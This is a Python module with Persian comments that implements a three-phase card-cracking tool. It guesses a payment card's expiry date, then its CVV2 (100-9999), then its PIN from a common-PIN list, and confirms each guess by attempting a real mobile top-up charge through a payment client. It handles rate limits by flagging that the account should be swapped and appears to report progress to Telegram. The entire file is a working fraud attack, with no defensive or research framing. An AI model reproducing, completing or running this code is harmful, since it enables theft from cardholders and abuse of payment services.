"""
موتور اسکن هوشمند 3 فازی
فاز 1: پیدا کردن تاریخ انقضا (60 تست)
فاز 2: پیدا کردن CVV2 (9900 تست)
فاز 3: پیدا کردن PIN (8 تست)
حداکثر ~10,000 تست به جای 4,752,000!
"""
import asyncio
from typing import Callable, Optional

from core.auth import IvaAuthClient
from core.constants import COMMON_PINS, VALID_KEYWORDS, RATE_LIMIT_KEYWORDS, BLOCKED_KEYWORDS
import config


class CardResult:
    """نتیجه اسکن کارت"""

    def __init__(self):
        self.pan: str = ""
        self.expire_month: str = ""
        self.expire_year: str = ""
        self.cvv2: str = ""
        self.pin: str = ""
        self.success: bool = False
        self.error_message: str = ""
        self.tests_performed: int = 0
        self.phase_reached: int = 0
        self.blocked: bool = False
        self.rate_limited: bool = False

    def to_dict(self) -> dict:
        return {
            "pan": self.pan,
            "expire_month": self.expire_month,
            "expire_year": self.expire_year,
            "cvv2": self.cvv2,
            "pin": self.pin,
            "success": self.success,
            "error_message": self.error_message,
            "tests_performed": self.tests_performed,
            "phase_reached": self.phase_reached,
        }


class SmartScanner:
    """
    موتور اسکن هوشمند سه‌فازی
    به جای تست همه ترکیب‌ها (4.7M)، هر پارامتر را جداگانه پیدا می‌کنیم
    """

    def __init__(self):
        self.stopped = False

    def stop(self):
        """توقف اسکن"""
        self.stopped = True

    @staticmethod
    def _get_expiry_combos() -> list:
        """60 ترکیب تاریخ انقضا: ماه‌های 01-12 در سال‌های 1406-1410"""
        combos = []
        for year in range(1406, 1411):
            for month in range(1, 13):
                combos.append((str(month).zfill(2), str(year)))
        return combos

    @staticmethod
    def _get_cvv_range() -> list:
        """محدوده CVV2 از 100 تا 9999"""
        return [str(i) for i in range(100, 10000)]

    @staticmethod
    def _classify_response(result: dict) -> str:
        """
        طبقه‌بندی پاسخ سرور
        valid: کارت معتبر (موجودی/اعتبار یا موفقیت)
        rate_limit: محدودیت (نیاز به تعویض اکانت)
        blocked: کارت مسدود
        error: اطلاعات نادرست (ادامه بده)
        """
        if result.get("success"):
            return "valid"

        msg = result.get("message", "")
        if not msg:
            return "error"

        for kw in VALID_KEYWORDS:
            if kw in msg:
                return "valid"
        for kw in RATE_LIMIT_KEYWORDS:
            if kw in msg:
                return "rate_limit"
        for kw in BLOCKED_KEYWORDS:
            if kw in msg:
                return "blocked"

        return "error"

    async def scan_card(
        self,
        pan: str,
        auth_client: IvaAuthClient,
        target_mobile: str = None,
        provider_id: str = "10",
        amount: int = 10000,
        on_progress: Callable = None,
        on_log: Callable = None,
        delay: float = None,
    ) -> CardResult:
        """
        اسکن هوشمند 3 فازی کارت
        on_progress(phase, current, total, found_so_far) - برای آپدیت زنده تلگرام
        on_log(message) - برای لاگ
        """
        if target_mobile is None:
            target_mobile = config.SCAN_TARGET_MOBILE
        if delay is None:
            delay = config.SCAN_DELAY

        result = CardResult()
        result.pan = pan

        async def log(msg: str):
            if on_log:
                try:
                    await on_log(msg) if asyncio.iscoroutinefunction(on_log) else on_log(msg)
                except Exception:
                    pass

        async def progress(phase: int, current: int, total: int, found: dict):
            if on_progress:
                try:
                    if asyncio.iscoroutinefunction(on_progress):
                        await on_progress(phase, current, total, found)
                    else:
                        on_progress(phase, current, total, found)
                except Exception:
                    pass

        found = {}

        # ============ فاز 1: پیدا کردن تاریخ انقضا ============
        await log("--- فاز 1: جستجوی تاریخ انقضا ---")
        expiry_combos = self._get_expiry_combos()
        fixed_cvv = "1234"
        fixed_pin = "1234"
        result.phase_reached = 1

        for i, (month, year) in enumerate(expiry_combos):
            if self.stopped:
                result.error_message = "متوقف شد توسط کاربر"
                return result

            result.tests_performed += 1
            await progress(1, i + 1, len(expiry_combos), found)

            try:
                charge_result = await auth_client.buy_charge(
                    amount=amount,
                    target_mobile=target_mobile,
                    provider_id=provider_id,
                    card={
                        "pan": pan,
                        "cvv2": fixed_cvv,
                        "expire_month": month,
                        "expire_year": year,
                        "pin": fixed_pin,
                    },
                )

                response_type = self._classify_response(charge_result)

                if response_type == "valid":
                    found["expire_month"] = month
                    found["expire_year"] = year
                    result.expire_month = month
                    result.expire_year = year
                    await log(f"[+] تاریخ انقضا پیدا شد: {month}/{year}")
                    break
                elif response_type == "rate_limit":
                    result.rate_limited = True
                    result.error_message = "محدودیت اکانت - نیاز به تعویض"
                    await log("[-] محدودیت اکانت!")
                    return result
                elif response_type == "blocked":
                    result.blocked = True
                    result.error_message = "کارت مسدود شده"
                    await log("[-] کارت مسدود!")
                    return result

            except Exception as e:
                await log(f"[-] خطا در تست {month}/{year}: {str(e)[:100]}")

            await asyncio.sleep(delay)
        else:
            # هیچ تاریخی پیدا نشد
            result.error_message = "تاریخ انقضا پیدا نشد"
            await log("[-] تاریخ انقضا پیدا نشد")
            return result

        # ============ فاز 2: پیدا کردن CVV2 ============
        await log("--- فاز 2: جستجوی CVV2 ---")
        cvv_range = self._get_cvv_range()
        result.phase_reached = 2

        for i, cvv in enumerate(cvv_range):
            if self.stopped:
                result.error_message = "متوقف شد توسط کاربر"
                return result

            result.tests_performed += 1
            await progress(2, i + 1, len(cvv_range), found)

            try:
                charge_result = await auth_client.buy_charge(
                    amount=amount,
                    target_mobile=target_mobile,
                    provider_id=provider_id,
                    card={
                        "pan": pan,
                        "cvv2": cvv,
                        "expire_month": found["expire_month"],
                        "expire_year": found["expire_year"],
                        "pin": fixed_pin,
                    },
                )

                response_type = self._classify_response(charge_result)

                if response_type == "valid":
                    found["cvv2"] = cvv
                    result.cvv2 = cvv
                    await log(f"[+] CVV2 پیدا شد: {cvv}")
                    break
                elif response_type == "rate_limit":
                    result.rate_limited = True
                    result.error_message = "محدودیت اکانت - نیاز به تعویض"
                    await log("[-] محدودیت اکانت!")
                    return result
                elif response_type == "blocked":
                    result.blocked = True
                    result.error_message = "کارت مسدود شده"
                    await log("[-] کارت مسدود!")
                    return result

            except Exception as e:
                if (i + 1) % 500 == 0:
                    await log(f"[-] خطا در CVV {cvv}: {str(e)[:100]}")

            await asyncio.sleep(delay)
        else:
            result.error_message = "CVV2 پیدا نشد"
            await log("[-] CVV2 پیدا نشد")
            return result

        # ============ فاز 3: پیدا کردن PIN ============
        await log("--- فاز 3: جستجوی PIN ---")
        result.phase_reached = 3

        for i, pin in enumerate(COMMON_PINS):
            if self.stopped:
                result.error_message = "متوقف شد توسط کاربر"
                return result

            result.tests_performed += 1
            await progress(3, i + 1, len(COMMON_PINS), found)

            try:
                charge_result = await auth_client.buy_charge(
                    amount=amount,
                    target_mobile=target_mobile,
                    provider_id=provider_id,
                    card={
                        "pan": pan,
                        "cvv2": found["cvv2"],
                        "expire_month": found["expire_month"],
                        "expire_year": found["expire_year"],
                        "pin": pin,
                    },
                )

                response_type = self._classify_response(charge_result)

                if response_type == "valid":
                    found["pin"] = pin
                    result.pin = pin
                    result.success = True
                    result.error_message = ""
                    await log(f"[+] PIN پیدا شد: {pin}")
                    await log("[+] کارت با موفقیت اسکن شد!")
                    break
                elif response_type == "rate_limit":
                    result.rate_limited = True
                    result.error_message = "محدودیت اکانت - نیاز به تعویض"
                    await log("[-] محدودیت اکانت!")
                    return result
                elif response_type == "blocked":
                    result.blocked = True
                    result.error_message = "کارت مسدود شده"
                    await log("[-] کارت مسدود!")
                    return result

            except Exception as e:
                await log(f"[-] خطا در PIN {pin}: {str(e)[:100]}")

            await asyncio.sleep(delay)
        else:
            # PIN پیدا نشد ولی انقضا و CVV داریم
            result.error_message = "PIN در لیست رایج پیدا نشد"
            await log("[-] PIN پیدا نشد (لیست رایج)")

        return result
